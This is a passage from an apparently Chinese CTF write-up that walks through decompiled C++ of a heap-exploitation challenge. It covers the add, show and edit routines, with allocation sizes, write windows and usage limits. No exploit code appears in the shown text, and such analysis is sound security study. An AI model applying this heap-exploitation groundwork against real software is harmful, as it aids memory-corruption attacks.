class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size1 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size1 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt;= state-&gt;min_size1 &amp;&amp; size &lt;= <span class="number">0x430</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size1 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size2 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size2 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt;= state-&gt;min_size2 &amp;&amp; size &lt;= <span class="number">0x450</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size2 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Mummy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j + <span class="number">0x10</span>], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span> &amp;&amp; info-&gt;ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;min_size3 &lt;= <span class="number">0x8F</span> )</span><br><span class="line">      state-&gt;min_size3 = <span class="number">0x90</span>;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    size = <span class="built_in">get_num</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x8F</span> &amp;&amp; size &lt;= <span class="number">0x440</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      state-&gt;min_size3 = size;</span><br><span class="line">      info-&gt;ptr[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( !info-&gt;ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      info-&gt;size[i] = size;</span><br><span class="line">      info-&gt;flag1[i] = <span class="number">0</span>;</span><br><span class="line">      info-&gt;flag2[i] = <span class="number">0</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; size / <span class="number">0x30</span>; ++j )</span><br><span class="line">        <span class="built_in">read_n</span>(&amp;info-&gt;ptr[i][<span class="number">0x30</span> * j + <span class="number">0x20</span>], <span class="number">0x10</span>LL);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0xE8</span>uLL);</span><br><span class="line">        v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;01dwang&#x27;s Gift:&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">read_n</span>(v11, <span class="number">0xE8</span>LL);</span><br><span class="line">        v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>添加操作一共有三种，分别对应猪A，猪B，猪C。猪A可以遍历 <code>0~19</code> 的索引，并添加一个大小在 <code>0x90~0x430</code> 的 <code>chunk</code>，猪B 只能遍历 <code>0~9</code> 的索引，并添加大小在 <code>0x90~0x450</code> 的 <code>chunk</code>。对于猪C，则是 <code>0~4</code> 的索引和 <code>0x90~0x440</code> 的 <code>chunk</code>。猪A, 猪B分配的<code>chunk</code>大小只能一次比一次大或者本次与上一次相等，但猪C没有这个限制。另外，在猪C函数中如果添加 <code>chunk</code> 的索引为 <code>4</code>，则还可以再分配一个大小为<code>0xE8</code>的<code>chunk</code>并写入最大长度为<code>0xE8</code>的内容。 3只猪在<code>add</code>之后可以立即向新分配的<code>chunk</code>中写入内容，但不是<code>chunk</code>中任何位置都能写，<code>chunk</code>空间以<code>48</code>字节为大小分组。对于猪A，每一组48字节空间只能写前面16字节，对于猪B则是只能写中间16字节，对于猪C只能写后面<code>16</code>字节。在写入后，会设置两个标志位为0。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( state-&gt;show_times &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;No view for you...&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">show_1</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">show_2</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">show_3</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    --state-&gt;show_times;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_1</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_2</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_3</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以查看的索引范围和可以<code>add</code>的索引范围相同。而且查看时需要有一个标志位为0。这个标志位是<code>add</code>中设置的两个标志位中的第一个。本题限制<code>view</code>的次数最多为2次。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( state-&gt;edit_times &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;No edit for you...&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">edit_1</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">edit_2</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">edit_3</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    --state-&gt;edit_times;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span 